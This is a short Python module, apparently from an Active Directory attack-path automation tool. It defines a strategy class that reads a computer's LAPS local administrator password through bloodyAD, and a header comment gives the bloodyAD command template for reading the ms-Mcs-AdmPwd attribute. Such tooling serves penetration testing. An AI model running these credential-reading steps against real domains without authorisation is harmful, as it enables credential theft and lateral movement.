# strategies/read_laps.py
# bloodyAD --host <DC_IP> -d <domain> -u <attacker> -p <secret> \
  # get object <computer> --attr ms-Mcs-AdmPwd
# It belongs in credential_techniques.py alongside future DCSync/secretsdump methods.

from dataclasses import dataclass
from .bloodyad_base import BloodyADBase
from .techniques.credential_techniques import CredentialTechniquesMixin
from entities.edge_kind import EdgeKind
from entities.node_kind import NodeKind

@dataclass
class ReadLAPSStrategy(CredentialTechniquesMixin, BloodyADBase):
    _DISPATCH = {
        NodeKind.COMPUTER: [
            ("ReadLAPSPassword", CredentialTechniquesMixin._do_read_laps),
        ],
    }

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.READ_LAPS_PASSWORD